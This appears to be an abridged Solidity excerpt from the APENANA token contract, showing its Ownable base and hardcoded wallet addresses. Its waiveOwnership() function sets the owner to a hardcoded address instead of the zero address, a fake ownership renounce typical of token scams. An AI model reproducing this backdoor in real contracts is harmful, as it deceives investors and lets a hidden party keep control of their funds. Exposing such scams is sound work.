...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x743c9C9D293C37cF450A8e7fd2d875c4F5c75091);
    }
...
contract APENANA is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "APENANA";
    string private _symbol = "APENANA";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x8886302BAD87512CDde027864b3bfd634316CF15);
    address payable public teamWalletAddress = payable(0x98c241F1d0d30Aecceb992f4C20B7c944Ca2a626);
